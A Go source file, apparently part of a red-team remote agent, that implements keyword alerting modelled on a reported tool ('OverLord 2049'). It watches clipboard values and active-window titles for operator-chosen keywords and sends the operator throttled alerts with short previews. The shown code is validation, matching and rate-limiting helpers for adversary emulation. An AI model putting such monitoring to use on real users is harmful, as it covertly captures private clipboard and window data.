//go:build linux || windows || darwin
// +build linux windows darwin

package main

// Keyword alerting (火绒 OverLord 2049 `notification_config`). The operator
// configures a keyword list, a minimum interval and whether to watch the
// clipboard; the agent matches against new clipboard values and active-window
// titles and emits a bounded alert frame. This mirrors the report's
// keywords/minIntervalMs/clipboardEnabled config, but it is intentionally a
// red-team observation aid: it reports matches to the operator, never modifies
// the clipboard and never collects matched content beyond a short preview.

import (
	"strings"
	"time"
	"unicode/utf8"
)

const (
	keywordMaxTerms    = 32
	keywordMaxTermLen  = 128
	keywordMaxPreview  = 160
	keywordMinInterval = 2 * time.Second // floor: never spam faster than this
	keywordMaxInterval = 3600 * time.Second
)

// keywordConfig is the operator-supplied watch configuration, decoded from the
// `keyword_watch` signal. Enabled=false stops the watcher.
type keywordConfig struct {
	Enabled       bool     `json:"enabled"`
	Keywords      []string `json:"keywords"`
	MinIntervalMs int      `json:"min_interval_ms"`
	Clipboard     bool     `json:"clipboard"`
	WindowTitle   bool     `json:"window_title"`
}

// normalizeKeywordConfig validates and clamps an operator config. Invalid
// terms are dropped (empty, too long); at most keywordMaxTerms survive. The
// interval is clamped to [keywordMinInterval, keywordMaxInterval].
func normalizeKeywordConfig(c keywordConfig) keywordConfig {
	out := keywordConfig{
		Enabled:       c.Enabled,
		Clipboard:     c.Clipboard,
		WindowTitle:   c.WindowTitle,
		MinIntervalMs: c.MinIntervalMs,
	}
	if out.MinIntervalMs < int(keywordMinInterval/time.Millisecond) {
		out.MinIntervalMs = int(keywordMinInterval / time.Millisecond)
	}
	if out.MinIntervalMs > int(keywordMaxInterval/time.Millisecond) {
		out.MinIntervalMs = int(keywordMaxInterval / time.Millisecond)
	}
	seen := map[string]bool{}
	for _, term := range c.Keywords {
		term = strings.TrimSpace(term)
		if term == "" || len(term) > keywordMaxTermLen || seen[term] {
			continue
		}
		seen[term] = true
		out.Keywords = append(out.Keywords, term)
		if len(out.Keywords) >= keywordMaxTerms {
			break
		}
	}
	return out
}

// keywordMatch returns the first configured term found in `text` (case-
// insensitive) or "" for no match. An empty keyword list never matches.
func keywordMatch(c keywordConfig, text string) string {
	if !c.Enabled || text == "" {
		return ""
	}
	lower := strings.ToLower(text)
	for _, term := range c.Keywords {
		if term != "" && strings.Contains(lower, strings.ToLower(term)) {
			return term
		}
	}
	return ""
}

// keywordPreview flattens a matched value into one short, single-line preview
// for the alert frame. It never includes more than keywordMaxPreview runes.
func keywordPreview(text string) string {
	text = strings.Join(strings.Fields(text), " ")
	if utf8.RuneCountInString(text) <= keywordMaxPreview {
		return text
	}
	runes := []rune(text)
	return string(runes[:keywordMaxPreview]) + "…"
}

// keywordAllow decides whether an alert should be emitted now, applying the
// per-session minimum interval. A change of term or source bypasses the interval
// (a new keyword on a different window is a distinct observation); otherwise
// repeated matches of the same term/source are throttled. It is called from the
// signaling read loop only, so no locking is needed here.
func keywordAllow(lastAt *time.Time, lastTerm *string, lastSource *string, term, source string, now time.Time, minInterval time.Duration) bool {
	changed := term != *lastTerm || source != *lastSource
	if !changed && !now.After(lastAt.Add(minInterval)) {
		return false
	}
	*lastAt = now
	*lastTerm = term
	*lastSource = source
	return true
}
